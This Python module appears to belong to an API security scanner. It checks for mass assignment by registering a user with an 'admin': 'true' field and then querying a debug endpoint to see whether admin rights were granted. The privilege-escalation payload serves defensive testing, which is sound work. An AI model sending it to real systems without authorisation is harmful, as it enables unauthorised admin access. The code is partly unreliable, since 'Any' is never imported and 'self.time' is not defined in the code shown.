#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Scanner
Checks if an API endpoint is vulnerable to mass assignment attacks
by attempting to set privileged attributes during object creation.
"""

import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class MassAssignmentScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("mass_assignment")
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        vulnerabilities = []
        
        test_payload = {
            "username": "test_mass_" + str(int(self.time.time())),
            "password": "test1",
            "email": "test_mass_" + str(int(self.time.time())) + "@dom.com",
            "admin": "true"
        }
        
        try:
            register_url = f"{url}/users/v1/register"
            register_resp = self.make_request(
                method="POST",
                endpoint="/users/v1/register",
                data=test_payload
            )
            
            if register_resp.status_code == 200:
                debug_resp = self.make_request(
                    method="GET",
                    endpoint="/users/v1/_debug"
                )
                
                if debug_resp.status_code == 200:
                    users = debug_resp.json().get("users", [])
                    for user in users:
                        if user.get("username") == test_payload["username"] and user.get("admin") == True:
                            request_data, response_data = self.capture_transaction(register_resp)
                            
                            self.add_finding(
                                title="Mass Assignment Vulnerability",
                                description="Successfully created admin user through mass assignment",
                                endpoint="/users/v1/register",
                                severity_level="tier2",
                                impact="Unauthorized privilege escalation through mass assignment",
                                request=request_data,
                                response=response_data,
                                remediation="Implement proper input validation and role-based access control"
                            )
                            break
                            
        except requests.RequestException as e:
            self.logger.error(f"Error in mass assignment check: {str(e)}")
            
        return self.findings

# Keep the scan function for backward compatibility
scan = MassAssignmentScanner().scan
